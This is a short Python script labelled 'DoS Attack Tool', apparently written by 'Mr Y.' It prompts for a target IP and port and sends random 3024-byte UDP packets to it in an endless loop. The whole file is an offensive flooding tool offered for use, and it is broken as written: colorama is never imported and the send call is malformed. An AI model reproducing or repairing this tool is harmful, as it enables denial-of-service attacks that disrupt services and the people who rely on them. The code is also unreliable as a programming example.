import socket
import random
import time

datasocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

colorama.init()

print("DoS Attack Tool.")

print("coded by Mr Y.")

ip = raw_input("İp: ")
port = input("Port: ")

bytes = random._urandom(3024)

while True:
	datasocket.sendto(bytes(ip,port))
